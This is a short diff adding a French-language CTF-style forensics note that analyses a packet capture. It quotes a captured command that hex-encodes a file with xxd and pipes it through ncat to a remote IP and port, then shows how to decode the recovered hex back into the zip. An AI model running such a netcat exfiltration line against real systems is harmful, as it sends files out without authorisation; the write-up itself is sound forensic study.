@@ -1,0 +1,6 @@
+En analysant le fichier .pcap on voit ça : 
+    xxd -p Documents/flag.zip | tr -d '\n' | ncat 172.20.20.133 20200
+
+Et sur le tcp stream suivant on voit la chaine xxd transmise (xxd convertit un fichier binaire en chaine hexa).
+Il suffit de faire l'inverse pour récupérer le fichier zip :
+    xxd -r -p hex.txt > flag.zip
